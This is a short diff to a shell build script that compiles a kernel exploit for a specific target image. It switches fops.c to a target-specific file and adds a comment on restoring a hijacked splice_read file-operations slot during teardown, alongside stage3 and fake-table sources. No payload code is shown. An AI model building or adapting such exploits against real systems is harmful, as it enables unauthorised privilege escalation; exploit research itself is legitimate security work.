@@ -41,7 +41,9 @@ cd "$exploit_root"
 
 # AZHJ statically matches the audited AZG3 exploit-relevant BTF layouts and
 # RVAs. Reuse the audited m3q source while selecting the AZHJ exact-image
-# target header at compile time.
+# target header at compile time. fops.c is AZHJ-specific because its teardown
+# must restore the exact stock NULL splice_read slot after the shared carrier
+# temporarily installs COPY_SPLICE_READ.
 "$compiler" \
     -O2 -g0 -Wall -Wextra -Werror \
     -Wno-unused-parameter -Wno-sign-compare -Wno-unused-function \
@@ -50,7 +52,7 @@ cd "$exploit_root"
     "src/targets/$source_project/main.c" \
     "src/targets/$source_project/util.c" \
     "src/targets/$source_project/slide.c" \
-    "src/targets/$source_project/fops.c" \
+    "src/targets/$project/fops.c" \
     "src/targets/$source_project/pipe.c" \
     src/faketables.c \
     src/stage3.c \
